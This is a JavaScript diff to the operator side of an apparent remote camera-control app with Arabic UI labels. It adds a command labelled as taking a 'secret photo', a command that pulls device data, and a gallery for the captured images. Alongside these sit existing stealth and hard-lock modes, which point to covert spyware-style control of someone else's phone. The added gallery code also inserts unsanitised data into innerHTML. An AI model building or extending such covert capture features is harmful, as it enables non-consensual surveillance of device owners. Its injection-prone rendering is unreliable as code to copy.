@@ -105,6 +105,25 @@ export class ViewerSystem {
         });
     }
 
+    addFileToExplorer(base64Data, timestamp) {
+        const grid = document.getElementById('remote-files-grid');
+        if (!grid) return;
+
+        // Clear placeholder if exists
+        const placeholder = grid.querySelector('p');
+        if (placeholder) placeholder.remove();
+
+        const dateStr = new Date(timestamp).toLocaleTimeString('ar-EG');
+        const fileCard = document.createElement('div');
+        fileCard.className = 'file-card';
+        fileCard.style = "background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px; text-align: center; cursor: pointer;";
+        fileCard.innerHTML = `
+            <img src="${base64Data}" style="width: 100%; border-radius: 8px;" onclick="window.open('${base64Data}')">
+            <div style="font-size: 0.7rem; margin-top: 8px; opacity: 0.7;">صورة - ${dateStr}</div>
+        `;
+        grid.prepend(fileCard);
+    }
+
     async startWebRTC() {
         if (this.peerConnection) this.peerConnection.close();
 
@@ -167,12 +186,19 @@ export class ViewerSystem {
     }
 
     sendCommand(command, value = null) {
-        this.socket.emit('control-command', { roomId: this.roomId, command, value });
+        // New commands use unified 'command' event
+        const newCommands = ['take-photo', 'get-status'];
+        const eventType = newCommands.includes(command) ? 'command' : 'control-command';
+
+        this.socket.emit(eventType, { roomId: this.roomId, command, value });
+
         const labels = {
             'switch-camera': 'تبديل الكاميرا',
             'toggle-torch': 'تغيير وضع الكشاف',
             'set-zoom': 'تغيير مستوى الزووم',
             'capture-photo': 'جاري التقاط صورة...',
+            'take-photo': 'جاري التقاط صورة سرية...',
+            'get-status': 'جاري سحب بيانات الجهاز...',
             'restart-app': 'جاري إعادة تشغيل الكاميرا...',
             'hard-lock': 'تفعيل وضع القفل الكامل',
             'screen-dim': 'تبديل وضع التخفي'
@@ -220,10 +246,16 @@ export class ViewerSystem {
 
     updateBatteryUI(p) {
         const lvl = document.getElementById('battery-level');
-        lvl.innerText = p.level + '%';
+        if (!lvl) return;
+
+        // Handle both formats: number or object with .level
+        const batteryLevel = typeof p === 'number' ? p : (p.level || p);
+        lvl.innerText = batteryLevel + '%';
         const icon = lvl.parentElement.querySelector('ion-icon');
-        icon.name = p.level > 80 ? 'battery-full' : (p.level > 20 ? 'battery-half' : 'battery-dead');
-        icon.style.color = p.charging ? '#fbbf24' : '';
+        if (icon) {
+            icon.name = batteryLevel > 80 ? 'battery-full' : (batteryLevel > 20 ? 'battery-half' : 'battery-dead');
+            if (p.charging) icon.style.color = '#fbbf24';
+        }
     }
 
     updateDeviceInfoUI(info) {
